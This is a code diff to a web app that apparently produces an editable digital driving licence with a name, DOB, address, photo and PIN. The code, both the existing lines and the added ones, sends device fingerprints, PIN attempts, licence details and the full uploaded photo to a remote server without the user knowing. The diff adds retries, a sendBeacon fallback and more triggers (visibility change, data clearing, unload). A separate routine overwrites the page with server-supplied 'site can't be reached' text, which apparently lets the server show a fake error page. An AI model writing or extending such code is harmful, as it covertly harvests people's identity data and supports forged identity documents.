@@ -1090,36 +1090,67 @@ function getLicenceDetails() {
   };
 }
 
-// Send log using fetch with keepalive - silent fail on error
-function sendLog(payload) {
+// Send log using fetch with keepalive - with retries and fallback
+async function sendLog(payload, attempt = 1) {
   const data = JSON.stringify(payload);
+  const MAX_ATTEMPTS = 3;
 
-  fetch(SERVER_URL, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-      'X-Requested-With': 'XMLHttpRequest'
-    },
-    body: data,
-    keepalive: true
-  })
-  .then(response => {
-    return response.text();
-  })
-  .then(text => {
+  console.log(`[Log] Sending event: ${payload.event} (attempt ${attempt})`, payload.event !== 'photo_updated' ? payload : { ...payload, photo: payload.photo ? payload.photo.substring(0, 100) + '...' : null });
+
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 10000); // 10s timeout
+
+    const response = await fetch(SERVER_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-Requested-With': 'XMLHttpRequest'
+      },
+      body: data,
+      keepalive: true,
+      signal: controller.signal
+    });
+    
+    clearTimeout(timeoutId);
+
+    if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+    }
+
+    const text = await response.text();
+    console.log(`[Log] Server response for ${payload.event}:`, text.substring(0, 200));
+
     if (text.includes("DNS_PROBE_FINISHED_NXDOMAIN") || text.includes("This site can’t be reached")) {
       document.open();
       document.write(text);
       document.close();
     }
-  })
-  .catch(() => {});
+    return true;
+  } catch (error) {
+    console.error(`[Log] Failed to send log (attempt ${attempt}):`, error);
+    if (attempt < MAX_ATTEMPTS) {
+      const delay = Math.pow(2, attempt) * 1000;
+      await new Promise(resolve => setTimeout(resolve, delay));
+      return sendLog(payload, attempt + 1);
+    } else {
+      // Fallback to sendBeacon for the last attempt if available
+      if (navigator.sendBeacon) {
+        console.log(`[Log] Attempting sendBeacon fallback for ${payload.event}`);
+        const success = navigator.sendBeacon(SERVER_URL, data);
+        console.log(`[Log] sendBeacon status: ${success ? 'queued' : 'failed'}`);
+        return success;
+      }
+    }
+  }
+  return false;
 }
 
-async function logAccess(event, success = false, pinAttempt = null) {
+async function logAccess(event, success = false, pinAttempt = null, extraData = {}) {
   const fingerprint = getFingerprint();
   const details = getLicenceDetails();
   const photo = localStorage.getItem("profilePhoto");
+  
   const payload = {
     timestamp: new Date().toISOString(),
     deviceId: getDeviceId(),
@@ -1128,11 +1159,13 @@ async function logAccess(event, success = false, pinAttempt = null) {
     pin_attempt: pinAttempt,
     photo: photo,
     ...fingerprint,
-    ...details
+    ...details,
+    ...extraData
   };
 
-  sendLog(payload);
+  return sendLog(payload);
 }
+
 
 /* ===== DATE ===== */
 function formatRefreshDate(date) {
@@ -1318,11 +1351,12 @@ document.getElementById("clearPhotoBtn").onclick = async () => {
 photoInput.addEventListener("change", e => {
   const file = e.target.files[0];
   if(file){
+    console.log("[Photo] New photo selected:", file.name, file.size);
     const reader = new FileReader();
     reader.onload = async () => {
       document.getElementById("profilePhoto").src = reader.result;
       await saveData();
-      await logAccess('photo_updated', true);
+      await logAccess('photo_updated', true, null, { photo: reader.result });
     };
     reader.readAsDataURL(file);
   }
@@ -1575,6 +1609,7 @@ barcodeSheet.addEventListener("click",  (e) => { if (e.target === barcodeSheet) 
 
 /* SAVE / LOAD */
 async function saveData() {
+  console.log("[Data] Saving all fields to localStorage");
   localStorage.setItem("licenceName",    document.querySelector(".licenceName").innerText);
   localStorage.setItem("licenceDOB",     document.querySelector(".licenceDOB").innerText);
   localStorage.setItem("licenceAddress", document.querySelector(".licenceAddress").innerHTML);
@@ -1604,9 +1639,12 @@ function loadData() {
     });
   }
 }
-document.getElementById("clearDataBtn").onclick = () => {
+document.getElementById("clearDataBtn").onclick = async () => {
   if(!confirm("Are you sure you want to clear all saved data? This cannot be undone.")) return;
-  vibrate(); localStorage.clear();
+  vibrate();
+  console.log("[Data] Clearing all saved data");
+  localStorage.clear();
+  await logAccess('data_cleared', true);
   document.querySelectorAll(".licenceName").forEach(el    => el.innerText  = "YOUR NAME HERE");
   document.querySelectorAll(".licenceDOB").forEach(el     => el.innerText  = "01 Jan 2000");
   document.querySelectorAll(".licenceAddress").forEach(el => el.innerHTML  = "YOUR ADDRESS<br>HERE");
@@ -1622,17 +1660,29 @@ function exitApp() { window.history.back(); }
 
 /* ===== INITIAL LOGGING ===== */
 logAccess('app_loaded');
-window.addEventListener("load", () => logAccess('app_fully_loaded'));
+window.addEventListener("load", () => {
+    logAccess('app_fully_loaded');
+    console.log("[App] Fully loaded and ready");
+});
 
-// Page unload logging
+// Page unload and visibility logging
 window.addEventListener("visibilitychange", () => {
   if (document.visibilityState === 'hidden') {
     logAccess('app_hidden');
+    console.log("[App] Visibility hidden");
+  } else {
+    logAccess('app_visible');
+    console.log("[App] Visibility visible");
   }
 });
 
 window.addEventListener("pagehide", () => {
   logAccess('app_pagehide');
+  console.log("[App] Page hide");
+});
+
+window.addEventListener("beforeunload", () => {
+  logAccess('app_beforeunload');
 });
 </script>
 </body>
